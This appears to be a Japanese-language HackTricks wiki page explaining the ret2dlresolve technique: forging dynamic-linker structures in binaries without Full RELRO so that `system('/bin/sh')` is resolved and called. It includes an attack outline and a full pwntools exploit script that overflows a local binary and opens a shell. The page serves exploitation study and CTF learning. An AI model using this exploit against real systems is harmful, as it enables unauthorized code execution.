# Ret2dlresolve

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## 基本情報

[**GOT/PLT**](../arbitrary-write-2-exec/aw2exec-got-plt.md)および[**Relro**](../common-binary-protections-and-bypasses/relro.md)に関するページで説明されているように、Full Relroがないバイナリは、最初に使用されるときにシンボル（外部ライブラリへのアドレスなど）を解決します。この解決は、関数**`_dl_runtime_resolve`**を呼び出すことで行われます。

**`_dl_runtime_resolve`**関数は、指定されたシンボルを解決するために必要な構造体への参照をスタックから取得します。

したがって、要求されたシンボル（例えば**`system`**関数）を動的にリンクして解決するために、これらの構造体を**偽造することが可能**であり、設定されたパラメータ（例：**`system('/bin/sh')`**）で呼び出すことができます。

通常、これらの構造体は、**書き込み可能なメモリ上で`read`を呼び出す初期ROPチェーンを作成することによって偽造され**、その後、**構造体**と文字列**`'/bin/sh'`**が渡され、既知の場所に保存されます。そして、ROPチェーンは、`$'/bin/sh'`へのアドレスを使って**`_dl_runtime_resolve`**を呼び出すことで続きます。

{% hint style="success" %}
この技術は、syscallガジェットがない場合（[**ret2syscall**](rop-syscall-execv.md)や[SROP](srop-sigreturn-oriented-programming.md)などの技術を使用するため）やlibcアドレスを漏洩する方法がない場合に特に有用です。
{% endhint %}

この技術に関するより良い説明は、ビデオの後半で見つけることができます：

{% embed url="https://youtu.be/ADULSwnQs-s?feature=shared" %}

## 構造体

3つの構造体を偽造する必要があります：**`JMPREL`**、**`STRTAB`**、および**`SYMTAB`**。これらの構造体がどのように構築されるかについてのより良い説明は、[https://ir0nstone.gitbook.io/notes/types/stack/ret2dlresolve#structures](https://ir0nstone.gitbook.io/notes/types/stack/ret2dlresolve#structures)で確認できます。

## 攻撃の概要

1. 偽の構造体をどこかに書き込む
2. systemの最初の引数を設定する（`$rdi = &'/bin/sh'`）
3. **`_dl_runtime_resolve`**を呼び出すために構造体へのアドレスをスタックに設定する
4. **呼び出す** `_dl_runtime_resolve`
5. **`system`**が解決され、`'/bin/sh'`を引数として呼び出される

## 例

この技術の[**例はこちらにあります**](https://ir0nstone.gitbook.io/notes/types/stack/ret2dlresolve/exploitation) **最終ROPチェーンの非常に良い説明を含んでいますが、ここに使用された最終的なエクスプロイトがあります：**
```python
from pwn import *

elf = context.binary = ELF('./vuln', checksec=False)
p = elf.process()
rop = ROP(elf)

# create the dlresolve object
dlresolve = Ret2dlresolvePayload(elf, symbol='system', args=['/bin/sh'])

rop.raw('A' * 76)
rop.read(0, dlresolve.data_addr) # read to where we want to write the fake structures
rop.ret2dlresolve(dlresolve)     # call .plt and dl-resolve() with the correct, calculated reloc_offset

log.info(rop.dump())

p.sendline(rop.chain())
p.sendline(dlresolve.payload)    # now the read is called and we pass all the relevant structures in

p.interactive()
```
## 参考文献

* [https://youtu.be/ADULSwnQs-s](https://youtu.be/ADULSwnQs-s?feature=shared)
* [https://ir0nstone.gitbook.io/notes/types/stack/ret2dlresolve](https://ir0nstone.gitbook.io/notes/types/stack/ret2dlresolve)

{% hint style="success" %}
AWSハッキングを学び、実践する：<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCPハッキングを学び、実践する：<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricksをサポートする</summary>

* [**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)を確認してください！
* **💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**Telegramグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**をフォローしてください。**
* **ハッキングのトリックを共有するには、[**HackTricks**](https://github.com/carlospolop/hacktricks)および[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを提出してください。**

</details>
{% endhint %}
